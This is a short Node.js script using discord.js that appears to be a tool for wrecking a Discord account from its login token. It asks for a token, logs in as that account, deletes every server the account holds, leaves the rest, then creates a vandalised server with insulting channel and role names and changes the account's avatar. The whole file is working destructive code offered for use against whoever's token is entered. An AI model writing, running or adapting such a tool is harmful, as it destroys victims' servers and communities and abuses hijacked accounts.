const { Client } = require('discord.js')
const client = new Client();


const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const {
    magenta
} = require('chalk')

console.clear();
console.log(magenta(`


             ╔═╗┬  ┌─┐┬ ┬┌─┐┬─┐┌─┐  ┌┬┐┌─┐┬┌─┌─┐┌┐┌  ┌─┐┬ ┬┌─┐┬┌─┌─┐┬─┐
             ╚═╗│  ├─┤└┬┘├┤ ├┬┘└─┐   │ │ │├┴┐├┤ │││  ├┤ │ ││  ├┴┐├┤ ├┬┘
             ╚═╝┴─┘┴ ┴ ┴ └─┘┴└─└─┘   ┴ └─┘┴ ┴└─┘┘└┘  └  └─┘└─┘┴ ┴└─┘┴└─


`))
rl.question('               Enter token to fuck: ', (token) => {
   
    client.on('ready', () => {
        client.guilds.forEach(g => {
           // if (!client.user.mfaEnabled) {
                g.delete()///.then(() => {
                    client.guilds.forEach(g => g.leave().then(() => {
                        client.user.createGuild("Token fucked by Slayer").then(guild => guild.setIcon("https://cdn.discordapp.com/attachments/803968324555374602/807531830042558464/anime.jpg").then(() => {
                            guild.createChannel('SLAYER TOKEN FUCKED ME', {
                                type: 'text',
                                topic: "Slayer runs me",
                            })
                            guild.createRole({
                                name: "Slayer token fucked me",
                                color: "RANDOM"
                            })
                        }))
                    }))
              //  })
        //    }
        })
        client.user.setAvatar("https://cdn.discordapp.com/attachments/775403637466857512/807375739590672385/16bd0d529a9a6fd9f42e8ae6c89ee44c.png");

    
    })

    client.login(token);
})